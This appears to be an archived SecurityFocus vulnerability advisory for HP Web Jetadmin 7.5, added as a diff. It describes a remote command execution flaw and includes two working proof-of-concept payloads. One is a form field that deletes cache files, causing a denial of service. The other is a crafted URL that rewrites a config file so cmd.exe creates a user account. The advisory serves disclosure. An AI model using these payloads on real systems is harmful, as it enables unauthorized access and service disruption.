@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/9973/info
+
+Reportedly HP web Jetadmin is prone to a remote arbitrary command execution vulnerability. This issue is due to a failure of the application to properly validate and sanitize user supplied input.
+
+Successful exploitation of this issue will allow a malicious user to execute arbitrary commands on the affected system.
+
+This issue has been tested with an authenticated account on HP Web Jetadmin version 7.5.2546 running on a Windows platform.
+
+/plugins/hpjfpmui/script/wja_update_product.hts:
+(Changed the value of obj to our DoS function)
+<FORM onsubmit="return VerifyUpload(this)" action=wja_update_product.hts
+method=post encType=multipart/form-data>
+<INPUT type=hidden value=[[httpd:RemoveCacheFiles($dir$)]] name=obj> <INPUT
+type=hidden value=true name=__save>
+<INPUT type=hidden value=0 name=packageCount> <INPUT type=hidden value=blah.fpm name=goodFilename>
+
+The following proof of concept that will create a user account has been provided by H D Moore <sflist@digitaloffense.net>:
+
+https://<target>:8443/plugins/framework/script/tree.xms?obj=httpd:WriteToFile([$__installdir$]conf/portlisten.conf,Listen%208000%0A%0DAccessLog%20"|../../../../../../winnt/system32/cmd.exe%20/c%20net%20user%20P%20P%20/ADD")
